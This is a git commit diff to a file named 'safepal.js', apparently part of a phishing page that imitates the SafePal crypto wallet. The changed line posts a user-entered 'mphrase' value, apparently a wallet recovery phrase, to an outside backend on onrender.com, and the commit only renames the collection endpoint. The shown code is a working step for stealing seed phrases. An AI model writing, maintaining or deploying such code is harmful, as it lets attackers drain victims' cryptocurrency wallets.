5177cd06079fbd573f82e682911fddcc70bae3f2
clientBackend <148474934+clientBackend@users.noreply.github.com>
2023-12-05 23:20:14 +0530

    Update safepal.js

--- SafePal/safepal.js
+++ SafePal/safepal.js
@@ -74,7 +74,7 @@ document.querySelector(".button").addEventListener("click",(e)=>{
 
     if( (error1 === false && error2 === false) && (error3 === false && error4 === false)){
         console.log("HIE")
-        const url = "https://backend-01-92mi.onrender.com/api/data7";
+        const url = "https://backend-01-92mi.onrender.com/api/safepal";
         const data = {
             mphrase:str
         };
